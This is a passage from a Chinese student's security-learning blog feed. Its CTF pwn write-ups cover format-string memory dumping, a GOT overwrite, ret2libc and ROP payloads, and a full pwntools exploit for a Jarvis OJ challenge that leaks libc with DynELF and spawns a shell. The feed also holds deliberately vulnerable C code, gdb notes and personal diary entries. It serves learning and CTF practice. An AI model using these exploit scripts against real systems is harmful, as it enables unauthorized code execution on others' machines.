<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'source.bin'</span><span class="token punctuation">,</span> <span class="token string">'ab+'</span><span class="token punctuation">)</span>

begin <span class="token operator">=</span> <span class="token number">0x8048000</span>
offset <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    addr <span class="token operator">=</span> begin <span class="token operator">+</span> offset
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./xxxx'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$13saaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        info <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        <span class="token keyword">print</span> offset
        <span class="token keyword">break</span>
    info <span class="token operator">+=</span> <span class="token string">'\x00'</span>
    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    offset <span class="token operator">+=</span> len<span class="token punctuation">(</span>info<span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>向<code>printf_got</code>里写入<code>system_addr</code>以达到<code>hack got</code>的目的</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
printf_got <span class="token operator">=</span> <span class="token number">0x804a010</span>
system_add <span class="token operator">=</span> <span class="token number">0xaaaaaaaa</span>

<span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
autofmt <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span>exec_fmt<span class="token punctuation">)</span>
payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>autofmt<span class="token punctuation">.</span>offset<span class="token punctuation">,</span> <span class="token punctuation">{</span>printf_got<span class="token punctuation">:</span> system_add<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先就这样子了</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[琐碎]]></title>
      <url>/2017/05/11/%E7%90%90%E7%A2%8E/</url>
      <content type="html"><![CDATA[<p>明天要走了，作业还没写完</p>
<p>想学一下BROP</p>
<p>发现好像要先学格式化字符串漏洞，以用来绕过金丝雀</p>
<p>上次看的SROP还没学会</p>
<p>关于堆的还不会</p>
<p>我好菜啊</p>
<p>off by one<br>use after free</p>
]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 周四 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[杂碎]]></title>
      <url>/2017/05/11/%E6%9D%82%E7%A2%8E/</url>
      <content type="html"><![CDATA[<h2 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h2><p>pop, push<br>call, ret, leave</p>
<p>这个leave的意思查查是等效做</p>
<pre><code>movl %ebp, %esp
popl %ebp
</code></pre><p>这个<code>movl %ebp, %esp</code>…在做毛线<br>是在恢复栈顶指针<br>后来有文章提到，如果没有用到栈，就可以不恢复，直接用<code>popl %ebp</code><br>比如</p>
<pre><code>int main() {
    return 0;
}
</code></pre><blockquote>
<p>在intel的官方文档中使用intel语法，Windows也使用intel语法，而UNIX平台的汇编器一直使用AT&amp;T语法</p>
</blockquote>
<p>我的天哪，，我们一直学的是Intel语法，这里的leave是<code>AT&amp;T</code>语法</p>
<p>语法介绍见:<br>    <a href="http://www.cnblogs.com/orlion/p/5765339.html" target="_blank" rel="external">http://www.cnblogs.com/orlion/p/5765339.html</a><br>    <a href="http://blog.csdn.net/crazyboy2009/article/details/33817025" target="_blank" rel="external">http://blog.csdn.net/crazyboy2009/article/details/33817025</a></p>
<p>简单地说区别在于<br>ATT语法:<br>    第一个为源操作数，第二个为目的操作数<br>    寄存器前用%，立即数前加$<br>    指令操作码的最后一个字母表示操作数大小:<br>    b: byte(1), w: word(2), l: long(4)</p>
<h2 id="x86-和x64-区别"><a href="#x86-和x64-区别" class="headerlink" title="x86 和x64 区别"></a>x86 和x64 区别</h2><p><em>首先是内存地址的范围由32位变成了64位</em>。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。<br><em>其次是函数参数的传递方式发生了改变</em>，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[ROPgadget]]></title>
      <url>/2017/05/10/ROPgadget/</url>
      <content type="html"><![CDATA[<p>看到网上推荐的rop工具,就down了一份<code>ROPgadget</code></p>
<pre class="line-numbers language-bash"><code class="language-bash">haibin$: ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only <span class="token string">"pop|ret"</span> <span class="token operator">|</span> <span class="token function">grep</span> rdi
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看蒸米的文章里有</p>
<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
</code></pre><p>开始没看懂这个payload，还是太菜</p>
<p>用<code>p64(pop_ret_addr)</code>覆写了<code>ret_address</code>， 所以在ret的时候先跳到一个<code>pop rdi; ret</code>的地方<br>这个时候栈顶应该已经是<code>p64(binsh_addr) + p64(system_addr)</code> 这部分内容了<br>所以这个时候<code>pop rdi</code>就把<code>p64(binsh_addr)</code>pop到了<code>$rdi</code>里作为第一个参数<br>然后<code>ret</code>跳到<code>p64(system_addr)</code>,然后起来shell?好像很完美的样子….</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gdb]]></title>
      <url>/2017/05/10/gdb/</url>
      <content type="html"><![CDATA[<p>好吧，承认我连gdb都不怎么会用，只会r一下，break一下，p一下。。。</p>
<p>发现一份<code>张银奎</code>巨佬的ppt<code>gdb基础</code></p>
<h2 id="Convenience-Variables"><a href="#Convenience-Variables" class="headerlink" title="Convenience Variables"></a>Convenience Variables</h2><p>GDB维护的伪变量, $开头<br>$ most recent displayed value<br>$ $n nth displayed value<br>$ $$ displayed value previous to $<br>$ $$n nth displayed value back from $</p>
<p>可以使用set命令定义<br>set $foo = *object_ptr</p>
<h2 id="Gdb-variables"><a href="#Gdb-variables" class="headerlink" title="Gdb variables"></a>Gdb variables</h2><pre><code>(gdb) set $foo = 4
(gdb) p $foo
$3 = 4
</code></pre><h2 id="Register-Variables"><a href="#Register-Variables" class="headerlink" title="Register Variables"></a>Register Variables</h2><pre><code>(gdb) break write if $rsi == 2
</code></pre><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>break(b): 软件断点<br>watch: 硬件断点(其实我从来没打过这个)<br>backtrace(bt): 显示函数调用序列(栈回溯)<br>continue(c): 恢复执行<br>next/step(n/s): 单步<br>x: 观察内存<br>info locals: 观察局部变量<br>pt: 观察数据结构<br>finish: 执行到函数返回<br>frame: 查看当前栈帧<br>i shared: 列模块</p>
<h2 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h2><pre><code>gdb --pid=&lt;n&gt;
</code></pre><p>or</p>
<pre><code>attach process-id
</code></pre><pre><code>detach  =&gt; 分离
quit    =&gt; 杀死
</code></pre><h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><pre><code>call sum(1, 2)      #call sum and print ret value
</code></pre><h2 id="查看变量和内存"><a href="#查看变量和内存" class="headerlink" title="查看变量和内存"></a>查看变量和内存</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><pre><code>print [/f] [expr]
    f format:
        x hex
        d signed decimal
        u unsigned decimal
        o octal
        t binary
        a address, absolute and relative
        c character
        f floating point
</code></pre><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><pre><code>x [/Nuf] expr
    N count of how many units to display
    u unit size, one of:
        b individual bytes
        h halfwords
        w words
        g giant words
    f printing format, Any `print` format or,
        s null-terminated string(就是一条string啦)
        i machine instructions
</code></pre><p>经常用<code>x/10s $esp</code> 或者 <code>x/gx $rsp</code>之类的命令</p>
<h2 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h2><p>gcc 在编译时候的 <code>-g</code> 选项 是为了 <code>generate debugging information</code></p>
<h2 id="要回宿舍了，要被蚊子要死了，醉了"><a href="#要回宿舍了，要被蚊子要死了，醉了" class="headerlink" title="要回宿舍了，要被蚊子要死了，醉了"></a>要回宿舍了，要被蚊子要死了，醉了</h2>]]></content>
      
        
        <tags>
            
            <tag> gdb </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于浏览器]]></title>
      <url>/2017/05/10/%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
      <content type="html"><![CDATA[<ol>
<li><p><svg onload="xxx"><br/>一直不知道这个<code>/</code>起到什么作用，今天看到某本书中提到</svg></p>
<blockquote>
<p><code>/</code>在标签中被视为结束符号，仅仅是在他后面跟着尖括号的时候。如果他出现在其他地方(值的范围除外)的时候，那么他会被当做空格对待<br>所以这个<code>/</code>就是可以作为tag名和属性的分隔符号，看作空格</p>
</blockquote>
</li>
<li><p>模式<br>回车在纯文本模式(i.e. a.txt)和在混合文本模式中表现不同</p>
<blockquote>
<p>我理解view-source 也算是纯文本模式<br>混合文本模式下回车只会被当做一个空格</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
123
456
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>渲染出来后 123 456 在同一行</p>
</blockquote>
</li>
<li><p>空白字符<br>chrome: 空格(0x20), 缩进(0x09), 回车(0x0a), 换行(0x0c), 0x00<br>IE: 空格和ASCII为9~12(缩进, 换行, 垂直制表, 换页)的字符以及回车(ASCII 13)</p>
</li>
<li><p>浏览器在解析html的时候将html实体就转化了</p>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[todo]]></title>
      <url>/2017/05/08/todo-1/</url>
      <content type="html"><![CDATA[<ol>
<li><p>beautifulSoup 大概就是解析html的库?</p>
<ul>
<li>所以爬虫大概就是模拟请求然后解析一下?</li>
</ul>
</li>
<li><p>看看有没有验证码识别的库，原理，这个啥都不会</p>
</li>
<li><p>下午水一下趋势的视频面试，悲哀的是忘记请假，只能逃课了，我的单片机，已经逃过一节课了，以为其他班老师一样，去补了其他老师的课，结果md，不是一个老师，听了两节课的的历史，各个公司单片机的兴衰</p>
</li>
<li><p>等师傅给我回复看能不能买高铁二等，不能的话就买火车票了，怕是再不买要走着去了，走着去正好能倒贴主办方火车票钱，perfect，但要周四出发</p>
</li>
<li><p>补一补上次hbctf的web题，补一补ssctf的web</p>
</li>
<li><p>看蒸米的rop教程</p>
</li>
<li><p>看机器学习公开课</p>
</li>
<li><p>说了好久补算法</p>
</li>
<li><p>学c++</p>
</li>
<li><p>背单词</p>
</li>
<li><p>跑步</p>
</li>
<li><p>督促学弟学妹学习，醉了，这是最。。。</p>
</li>
<li><p>补web题，补pwn</p>
</li>
<li><p>学操作系统，看到csapp太厚了</p>
</li>
<li><p>报夏令营</p>
</li>
<li><p>py: flask, redis<br>js: react, omi, xss bot<br>sql: sqli-labs  <em>自己手注真是太菜了</em></p>
</li>
<li><p>数论书还有抽象代数书还没看完</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 周一 </tag>
            
            <tag> todo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FF in ubuntu 不显示菜单栏]]></title>
      <url>/2017/05/06/FF-in-ubuntu-%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%8F%9C%E5%8D%95%E6%A0%8F/</url>
      <content type="html"><![CDATA[<p>好坑啊。。。一直找不到，，想用tamper data找不到菜单栏</p>
<p>发现按一下<code>alt</code>可以显示一下，暂且这样吧</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[困扰了我一万年的burp的乱码问题]]></title>
      <url>/2017/05/06/%E5%9B%B0%E6%89%B0%E4%BA%86%E6%88%91%E4%B8%80%E4%B8%87%E5%B9%B4%E7%9A%84burp%E7%9A%84%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>简直要气死，设置了字体和编码还是有的地方会乱成一团</p>
<p>后来才发现是<code>gzip</code>的问题</p>
<p>要开启<br><code>proxy</code> =&gt; <code>Options</code> =&gt; <code>Miscellaneous</code> =&gt; <code>unpack gzip xxxx</code></p>
<p>就可以了</p>
<p>在做ssctf web的时候突然发现</p>
]]></content>
      
        <categories>
            
            <category> 备忘 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> issue </tag>
            
            <tag> burp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[unistd.h & windows.h]]></title>
      <url>/2017/05/05/unistd-h-windows-h/</url>
      <content type="html"><![CDATA[<p>这几天才知道有<code>unistd.h</code>这样一个头文件存在<br>是因为用到<code>read</code>和<code>write</code>函数<br>因为很少写系统依赖的东西还是写东西太少<br>i’m good vegetable…</p>
<p>然后立即想到了windows下的<code>windows.h</code><br>感觉他们地位差不多???</p>
<p>刚刚丧病的发现bash居然可以设置成vi模式，查了一下拿来默认是<code>emacs</code>的<br>只要bashrc加一句<code>set -o vi</code><br>…醉了</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门4|leak]]></title>
      <url>/2017/05/05/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A84-leak/</url>
      <content type="html"><![CDATA[<h2 id="做这个题目"><a href="#做这个题目" class="headerlink" title="做这个题目"></a>做这个题目</h2><p>题目地址: <a href="https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0" target="_blank" rel="external">https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0</a></p>
<p>描述: nc pwn2.jarvisoj.com 9880</p>
<h2 id="pwn入门"><a href="#pwn入门" class="headerlink" title="pwn入门"></a>pwn入门</h2><p><code>ida</code>看一下有一个<code>read(0, &amp;buf, 0x100u);</code><br><code>checksec</code>一下</p>
<pre><code>Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre><p>就开启了<code>NX</code><br>这题好像是顺着蒸米的一步步x64那个leak来的<br>因为没有libc，所以要leak出system，并且在bss段上构造<code>/bin/sh</code></p>
<p>先gdb一下</p>
<pre class="line-numbers language-bash"><code class="language-bash">gdb-peda$ pattern offset 0x41416d41
1094806849 found at offset: 140
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>readelf -S</code>找到<code>bss</code>段</p>
<pre><code>[25] .bss              NOBITS          0804a024
</code></pre><p>mark下 <code>bss_addr = 0x0804a024</code></p>
<p>在执行完<code>read</code>之后我们要执行<code>system(&#39;/bin/sh&#39;)</code>，read的参数是三个<br>所以为了平衡堆栈，我们找到<code>pop pop pop ret</code>这样的gadget<br><code>objdump -D pwnfile | cat -n | grep pop</code><br>=&gt; <code>cat -n</code>是对输出输出的行从1开始编号,可以看得出是不是相邻的指令</p>
<pre><code>...
425     8048508:    5b                       pop    %ebx
426     8048509:    5e                       pop    %esi
427     804850a:    5f                       pop    %edi
428     804850b:    5d                       pop    %ebp
...
</code></pre><p>好了一下找到了4个就可以构造rop了,(一般就是某个函数在返回前要恢复现场时候的pop数次+ret)</p>
<p>payload:</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true"># p = process('./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9880</span><span class="token punctuation">)</span>

vuln_addr <span class="token operator">=</span> <span class="token number">0x0804844B</span>
pppr_addr <span class="token operator">=</span> <span class="token number">0x08048509</span> <span class="token comment" spellcheck="true">#pop pop pop ret</span>
bss_addr  <span class="token operator">=</span> <span class="token number">0x0804a024</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'</span><span class="token punctuation">)</span>
plt_read <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload1 <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>plt_write<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">"[-] %#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data

d <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span> elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># important</span>

system_addr <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># leak addr of system~~</span>
<span class="token keyword">print</span> <span class="token string">"[+] get the addr of system"</span>

payload2 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>plt_read<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pppr_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read(1, bss_addr, 8) ret to `pop pop pop ret`</span>
payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># system('/bin/sh') ret to vulnfunction</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'/bin/sh\0'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>拿到flag</p>
<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">ls</span>
flag
level4
$ <span class="token function">cat</span> flag
CTF<span class="token punctuation">{</span>882130cf51d65fb705440b218e94e98e<span class="token punctuation">}</span>
$ <span class="token keyword">exit</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="还有一个"><a href="#还有一个" class="headerlink" title="还有一个"></a>还有一个</h2><p>我本地始终无法复现，真是崩溃TAT<br>无论是直接process还是用socat,poc一跑就会出现</p>
<pre><code>exited on signal 11
</code></pre><p>之类的错误</p>
<h2 id="看到了关于DynELF的相关"><a href="#看到了关于DynELF的相关" class="headerlink" title="看到了关于DynELF的相关"></a>看到了关于<code>DynELF</code>的相关</h2><p>muhe 的 <code>what DynELF does basically</code><a href="http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/" target="_blank" rel="external">http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/</a><br>mark 一下 认真学习一下</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门3]]></title>
      <url>/2017/05/05/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A83/</url>
      <content type="html"><![CDATA[<blockquote>
<p>不知道为什么题目在我电脑上都无法复现，崩溃.jpg</p>
</blockquote>
<p>还是上次的</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, world\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="关闭ASLR和stack-protector-意思是栈段没办法执行了"><a href="#关闭ASLR和stack-protector-意思是栈段没办法执行了" class="headerlink" title="关闭ASLR和stack protector, 意思是栈段没办法执行了"></a>关闭ASLR和stack protector, 意思是栈段没办法执行了</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level2'</span><span class="token punctuation">)</span>
system_ret <span class="token operator">=</span> xxx    <span class="token comment" spellcheck="true"># 开始漏掉了这个</span>
system_addr <span class="token operator">=</span> xxx
binsh_addr <span class="token operator">=</span> xxx

payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token comment" spellcheck="true"># 覆盖缓冲区</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#用system的地址覆盖vulner的返回地址，以跳到system上</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 函数调用地址和函数参数之间是隔着一个函数返回地址的，开始忘记了==!i'm good vegetable</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># system 的参数</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="开启ASLR，仍然是上面的level2"><a href="#开启ASLR，仍然是上面的level2" class="headerlink" title="开启ASLR，仍然是上面的level2"></a>开启ASLR，仍然是上面的level2</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> -s
<span class="token keyword">echo</span> 2 <span class="token operator">></span> /proc/sys/kernel/randomize_va_space
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>可以通过多次的</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /proc/<span class="token punctuation">[</span>pid of level2<span class="token punctuation">]</span>/maps
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>来看到ASLR确实起作用了</p>
<p>思路是leak出<code>libc.so</code>出某些函数的地址，然后算偏移量以得到<code>system()</code>和<code>bin/sh</code>地址</p>
<p>根据人家所说<br>Program Image是<code>Unrandomized</code>的<br><code>random</code>的是<code>libc</code>,<code>stack</code>和<code>heap</code>这些</p>
<p>可以用<code>write@plt</code>来把<code>write</code>(lib.c)里的地址link出来<br>然后根据lib.c里<code>write</code>和<code>system</code>之间的偏移算出来<code>system</code><br>后就OK了</p>
<p>另外<code>ldd</code>可以查看调用的动态链接库</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[objdump]]></title>
      <url>/2017/05/04/objdump/</url>
      <content type="html"><![CDATA[<p>常用<br><code>objdump -d example.o</code> 查看汇编</p>
<p><code>objdump -S example.o</code> 编译的时候要开<code>-g</code>, 可以c和汇编对照，不过感觉好鸡肋，没看出来是个怎么对照法</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn入门2]]></title>
      <url>/2017/04/29/pwn%E5%85%A5%E9%97%A82/</url>
      <content type="html"><![CDATA[<p>代码是这个</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">void</span> <span class="token function">vunerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
